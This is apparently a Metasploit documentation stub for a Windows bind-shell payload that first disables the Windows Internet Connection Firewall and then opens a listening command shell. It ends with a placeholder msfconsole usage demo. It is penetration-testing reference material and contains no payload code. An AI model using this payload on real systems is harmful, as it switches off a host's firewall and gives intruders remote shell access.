## Windows Disable Windows ICF, Command Shell, Bind TCP Inline

Disable the Windows ICF, then listen for a connection and 
spawn a command shell


## Module Name
payload/windows/shell_bind_tcp_xpfw

## Authors
Lin0xx <lin0xx[at]metasploit.com>





## Platforms
win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell_bind_tcp_xpfw
msf payload(shell_bind_tcp_xpfw) > show targets
   ... a list of targets ...
msf payload(shell_bind_tcp_xpfw) > set TARGET <target-id>
msf payload(shell_bind_tcp_xpfw) > show options
   ... show and set options ...
msf payload(shell_bind_tcp_xpfw) > run
```
    
    